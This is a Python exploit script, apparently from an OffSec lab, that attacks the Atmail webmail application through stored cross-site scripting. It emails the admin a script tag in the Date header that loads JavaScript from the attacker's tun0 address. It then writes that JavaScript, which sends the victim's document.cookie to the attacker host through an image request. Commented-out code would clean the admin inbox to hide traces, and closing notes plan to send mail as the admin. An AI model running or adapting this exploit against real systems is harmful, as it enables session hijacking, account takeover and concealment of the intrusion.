import os
import subprocess
import netifaces as ni
if __name__ == "__main__":
    cwd = os.getcwd()
    attacker_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
    print(attacker_ip)
    script = cwd + "/" + "atmail_sendemail.py"
    target = "atmail"
    payload = "<script src='http://" + attacker_ip + "/atmail-session.js'></script>"
#    payload = "<script src='http://" + attacker_ip + "/boogers'></script>"
    # 1. Send an email to admin@offsec.local with a malicious payload in the Date field, that references a JavaScript file on our attacking server
    status = subprocess.call([script, target, payload])
    if(status != 0):
        print("error sending mail",status)
    # 2. Create a JavaScript file on our attacking server that will be called by the tag described in step 1
    fp = open('atmail-session.js', 'w')
    payload = 'function addTheImage() {var img = document.createElement("img");img.src="http://'+attacker_ip+'/" + document.cookie;document.body.appendChild(img);}addTheImage();'
    fp.write(payload)
    fp.close()
    # Cleanup
    script = cwd + "/" + "clean_admin_inbox.py"
    target = "atmail"
    '''
    status = subprocess.call([script, target])
    if(status != 0):
        print("error cleaning up our tracks:",status)   
    '''
'''


3. Include code in the JavaScript file that will send an email from admin@offsec.local to attacker@offsec.local
4. Start the simple Python web server from the same directory where the malicious JavaScript file is located
5. Log in to the admin@offsec.local account to trigger the XSS
'''